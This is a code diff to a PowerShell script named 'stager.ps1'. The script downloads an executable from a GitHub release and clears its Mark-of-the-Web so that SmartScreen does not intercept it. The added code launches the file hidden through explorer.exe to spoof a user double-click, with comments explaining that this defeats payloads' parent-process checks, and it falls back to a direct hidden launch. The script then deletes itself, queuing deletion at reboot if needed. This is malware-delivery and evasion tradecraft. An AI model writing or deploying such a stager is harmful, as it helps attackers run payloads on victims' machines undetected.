@@ -1,5 +1,6 @@
 # language: PowerShell 5.1+ / 7.x, file: stager.ps1
-# Pull a release asset from GitHub, verify it, launch it detached, clean up after itself.
+# Pull a release asset from GitHub, verify it, hand it to Explorer to launch,
+# then clean up after itself.
 
 $ErrorActionPreference = 'SilentlyContinue'
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -37,8 +38,31 @@ if ($head[0] -ne 0x4D -or $head[1] -ne 0x5A) { Remove-Item $dest -Force; return 
 # clear Mark-of-the-Web so SmartScreen does not intercept the launch
 Unblock-File -Path $dest -ErrorAction SilentlyContinue
 
-# launch detached. the payload may ask for elevation itself; that prompt is its own
-Start-Process -FilePath $dest -WindowStyle Hidden
+# ---------------------------------------------------------------- launch
+#
+# This is the part that matters. Handing the file to Explorer instead of
+# calling Start-Process from PowerShell changes the parent process:
+#
+#   Start-Process  ->  parent = powershell.exe   (looks scripted)
+#   explorer.exe   ->  parent = explorer.exe     (looks double-clicked)
+#
+# Payloads that walk their own parent chain treat those two very differently.
+# The second is what a user gets when they double-click the file themselves,
+# so that is what we reproduce here.
+
+Start-Process explorer.exe -ArgumentList $dest -WindowStyle Hidden
+
+# give Explorer a moment to actually create the child process, then look for it
+Start-Sleep -Seconds 3
+$leaf = [System.IO.Path]::GetFileNameWithoutExtension($dest)
+$running = Get-Process -Name $leaf -ErrorAction SilentlyContinue
+
+if (-not $running) {
+    # Explorer refused (policy, SmartScreen, missing association) - fall back
+    # to a direct launch so the payload still gets its chance.
+    Start-Process -FilePath $dest -WindowStyle Hidden
+    Start-Sleep -Seconds 2
+}
 
 # cleanup: a mapped image stays locked, so retry every 2 s for up to 10 min.
 # if it is still locked by then, queue the delete for next boot.
